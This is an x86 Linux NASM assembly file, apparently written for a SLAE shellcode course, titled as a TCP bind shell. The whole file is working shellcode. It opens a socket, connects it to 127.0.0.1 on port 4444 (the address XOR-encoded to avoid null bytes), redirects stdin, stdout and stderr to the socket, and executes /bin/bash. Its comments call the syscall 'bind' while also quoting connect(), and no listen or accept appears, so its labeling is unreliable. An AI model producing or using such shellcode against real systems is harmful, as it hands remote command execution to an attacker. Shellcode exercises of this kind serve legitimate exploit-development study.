; Filename: shell_bind_tcp.nasm
; Author:   SLAE-755

global _start

section .text

_start:

; int socket(int domain, int type, int protocol);
;     socket(AF_INET, SOCK_STREAM, 0);
;     socket(2, 1, 0)
;

; EAX = socket()	-> 359
; EBX = AF_INET		-> 2
; ECX = SOCK_STREAM	-> 1


xor eax, eax
mov ebx, eax
mov ecx, eax
mov edx, eax

mov ax, 0x167 ; 359 in decimal
mov bl, 0x2
inc cl

int 0x80
mov ebx, eax  ; storing the socket descriptor into EBX for next syscall



; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
;     connect(socket, [2, 4444, "127.0.0.1"], 16)



; EAX = 0x16A		-> 362 in decimal (bind)
; ECX = mysocketaddr	-> point to data struct
; EDX = 0x10		-> 16 in decimal

xor eax, eax
mov edx, eax
mov ax, 0x16A		; 362 in decimal

xor ecx, ecx
push ecx		; pushing 32 bit INADDR_ANY

; 127 = 0x7f
; 0   = 0x0 
; 0   = 0x0 
; 1   = 0x1

; push 0x0100007f		; 127.0.0.1
; Dencoding the IP Adress

mov ecx, 0xfeffff80	;0x7f^ff .... 01^ff 
xor ecx, 0xffffffff
push ecx

push word 0x5c11	; pushing htons(PORT 4444)
push word 0x2		; pushing AF_INET as sin_family


mov ecx, esp
mov dl, 0x10		; 16 in decimal

int 0x80



; int dup2(int oldfd, int newfd);
;     dup2(client_sock, X)

xor ecx, ecx
mov cl, 0x2

xor eax, eax
mov al, 0x3F	; 63 in decimal
int 0x80	; duplicating file descriptor 2

dec ecx

xor eax, eax
mov al, 0x3F	; 63 in decimal
int 0x80	; duplicating file descriptor 1

dec ecx

xor eax, eax
mov al, 0x3F	; 63 in decimal
int 0x80	; duplicating file descriptor 0


;int execve(const char *path, char *const argv[], char *const envp[]);

; PUSH the first null dword 
xor eax, eax
push eax

; PUSH ////bin/bash (12) 

push 0x68736162
push 0x2f6e6962
push 0x2f2f2f2f

; PUSH //bin/sh (8 bytes) 

;	push 0x68732f2f
;	push 0x6e69622f


mov ebx, esp

push eax
mov edx, esp

push ebx
mov ecx, esp


mov al, 11
int 0x80
